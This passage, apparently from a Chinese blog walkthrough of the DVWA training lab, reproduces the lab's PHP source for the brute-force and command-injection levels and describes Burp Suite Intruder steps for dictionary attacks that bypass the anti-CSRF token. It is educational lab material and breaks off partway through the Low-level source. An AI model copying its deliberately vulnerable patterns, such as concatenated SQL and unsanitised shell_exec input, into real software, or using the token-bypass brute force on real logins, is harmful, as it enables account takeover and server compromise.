class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><ul><li><p>使用 Burp Suit 抓包</p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425163429574.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425163429574"></p></li><li><p>Send to intruder</p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425163500449.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425163500449"></p></li><li><p>选择密码位置</p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425163605602.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425163605602"></p></li><li><p>上字典</p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425164245642.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425164245642"></p></li><li><p>根据返回长度判断正确密码</p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425171021802.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425171021802"></p></li></ul><h3 id="medium"><a class="markdownIt-Anchor" href="#medium">#</a> Medium</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = mysqli_fetch_assoc( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( <span class="number">2</span> );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><ul><li>加入了参数的判断，防止部分 SQL 注入，加入 sleep (2)</li><li>没有防爆破机制，操作同 Low 等级</li></ul><h3 id="high"><a class="markdownIt-Anchor" href="#high">#</a> High</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = stripslashes( <span class="variable">$user</span> );</span><br><span class="line">    <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = stripslashes( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = mysqli_fetch_assoc( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">0</span>, <span class="number">3</span> ) );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><ul><li><p>加入 Anti-CSRF token 机制，验证本次请求中是否包含上一个回应中的 token</p></li><li><p>抓包分析</p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425174153220.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425174153220"></p></li><li><p>Send to intruder，选择 position，两个爆破位应使用 Pitchfork 模式</p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425174257108.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425174257108"></p></li><li><p>option 中选择 Grep-Extract，添加回应包中的 token 值</p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425174734492.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425174734492"></p></li><li><p>第一个位置应用字典，第二个位置应用 grep 内容，并初始化 token 值</p></li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425175021711.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425175021711"></p><ul><li>Start attack，一样看长度</li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425175428340.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425175428340"></p><hr><h2 id="command-injection"><a class="markdownIt-Anchor" href="#command-injection">#</a> Command Injection</h2><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425175815201.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425175815201"></p><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#Command Injection</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Impossible Command Injection Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line">    <span class="variable">$target</span> = stripslashes( <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Split the IP into 4 octects</span></span><br><span class="line">    <span class="variable">$octet</span> = explode( <span class="string">&quot;.&quot;</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check IF each octet is an integer</span></span><br><span class="line">    <span class="keyword">if</span>( ( is_numeric( <span class="variable">$octet</span>[<span class="number">0</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">1</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">2</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">3</span>] ) ) &amp;&amp; ( sizeof( <span class="variable">$octet</span> ) == <span class="number">4</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// If all 4 octets are int&#x27;s put the IP back together.</span></span><br><span class="line">        <span class="variable">$target</span> = <span class="variable">$octet</span>[<span class="number">0</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">1</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">2</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">        <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// Windows</span></span><br><span class="line">            <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// *nix</span></span><br><span class="line">            <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Ops. Let the user name theres a mistake</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#High Command Injection Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = trim(<span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Medium Command Injection Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Low Command Injection Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span 